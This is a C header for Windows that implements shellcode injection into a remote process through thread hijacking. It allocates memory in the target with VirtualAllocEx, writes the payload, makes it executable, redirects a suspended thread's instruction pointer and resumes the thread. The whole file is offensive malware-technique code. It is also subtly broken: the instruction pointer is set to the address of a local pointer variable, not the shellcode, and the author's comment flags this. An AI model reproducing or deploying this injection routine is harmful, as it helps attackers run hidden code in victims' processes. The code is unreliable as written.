#pragma once
#include <stdio.h>
#include <Windows.h>


BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten    = NULL;
	DWORD   dwOldProtection          = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


    CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

 	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = (DWORD64)&ppAddress; //MAY BE PROBLEMS HERE! 
  
	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);
	
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}